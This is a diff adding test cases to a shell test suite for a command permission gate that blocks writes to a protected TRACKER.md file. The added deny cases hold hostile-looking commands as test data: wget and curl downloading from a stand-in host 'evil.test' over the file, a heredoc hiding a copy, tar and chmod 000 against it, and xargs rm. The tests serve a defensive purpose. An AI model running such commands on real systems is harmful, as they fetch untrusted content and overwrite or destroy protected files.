@@ -222,6 +222,25 @@ deny "bash -c 'gh issue create --title x --body-file /tmp/b'"
 deny "env -S \"\$CMD\""
 allow "bash -c 'echo hi'"
 
+echo "== final admission repair: parser errors, interpreter heredocs, omitted mutators, xargs targets, and read-only find -exec =="
+# A shell parser error must fail closed — the payload is unvetted, even when it does not mention an
+# explicit interpreter word. Red-when-broken: return empty analysis on ValueError → this write ALLOWS.
+deny "echo 'ticket: hacked' > TRACKER.md \""
+# Interpreter here-documents hide their body from the tokenizer; a nested writer must DENY until the
+# body is inspected or refused as opaque. Red-when-broken: ignore `<<EOF … EOF` payloads → ALLOW.
+deny $'bash <<EOF\ncp src/payload.ts TRACKER.md\nEOF'
+# Representative network/archive/permission mutators must contribute a governed target, not fall
+# through the command-head allowlist and ALLOW writes to protected surfaces.
+deny "wget -O TRACKER.md http://evil.test/x"
+deny "curl -o TRACKER.md http://evil.test/x"
+deny "tar -cf TRACKER.md src/payload.ts"
+deny "chmod 000 TRACKER.md"
+# `xargs` feeds a mutator's target set from stdin; the hidden target must fail closed, not disappear.
+deny "echo TRACKER.md | xargs rm"
+# Preserve the required positive path: read-only `find -exec` stays ALLOWED.
+allow "find src -type f -exec cat {} \\;"
+allow "find src -type f -exec grep -n payload {} \\;"
+
 echo "== the shared Path Gate recurses through shell payloads, scripts, and startup files for generic writers too =="
 deny "bash '$WRITER'"
 deny "sh '$WRITER'"
